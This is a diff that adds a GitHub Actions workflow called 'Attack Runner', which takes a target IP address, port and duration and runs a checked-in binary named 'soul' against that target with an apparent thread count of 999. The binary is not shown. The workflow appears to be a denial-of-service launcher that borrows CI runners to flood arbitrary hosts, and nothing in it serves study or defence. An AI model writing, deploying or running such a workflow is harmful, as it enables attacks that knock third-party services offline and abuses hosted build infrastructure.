@@ -1,0 +1,24 @@
+name: Attack Runner
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Target IP Address'
+        required: true
+        default: '1.1.1.1'
+      target_port:
+        description: 'Target Port'
+        required: true
+        default: '80'
+      duration:
+        description: 'Attack Duration (seconds)'
+        required: true
+        default: '60'
+
+jobs:
+  attack:
+    runs-on: ubuntu-22.04
+    steps:
+    - uses: actions/checkout@v3
+    - run: chmod +x soul
+    - run: ./soul ${{ inputs.target_ip }} ${{ inputs.target_port }} ${{ inputs.duration }} 999
